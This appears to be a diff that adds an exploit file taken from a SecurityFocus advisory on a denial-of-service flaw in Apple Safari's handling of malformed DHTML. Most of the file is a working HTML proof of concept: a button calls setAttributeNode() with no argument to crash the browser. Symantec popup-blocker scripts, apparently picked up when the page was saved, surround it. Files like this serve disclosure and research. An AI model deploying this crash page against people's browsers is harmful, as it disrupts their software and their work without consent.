@@ -1,0 +1,70 @@
+source: http://www.securityfocus.com/bid/18822/info
+
+Apple Safari web browser is prone to a denial-of-service vulnerability when parsing certain malformed DHTML elements.
+
+An attacker can exploit this issue to crash an affected browser.
+
+<script language="JavaScript">
+<!--
+
+function SymError()
+{
+  return true;
+}
+
+window.onerror = SymError;
+
+var SymRealWinOpen = window.open;
+
+function SymWinOpen(url, name, attributes)
+{
+  return (new Object());
+}
+
+window.open = SymWinOpen;
+
+//-->
+</script>
+
+<script>
+
+// MoBB Demonstration
+function Demo() {
+	var a = document.createElement("a");
+	a.setAttributeNode();
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
+
+
+</body></html>
+
+<script language="JavaScript">
+<!--
+var SymRealOnLoad;
+var SymRealOnUnload;
+
+function SymOnUnload()
+{
+  window.open = SymWinOpen;
+  if(SymRealOnUnload != null)
+     SymRealOnUnload();
+}
+
+function SymOnLoad()
+{
+  if(SymRealOnLoad != null)
+     SymRealOnLoad();
+  window.open = SymRealWinOpen;
+  SymRealOnUnload = window.onunload;
+  window.onunload = SymOnUnload;
+}
+
+SymRealOnLoad = window.onload;
+window.onload = SymOnLoad;
+
+//-->
+</script>
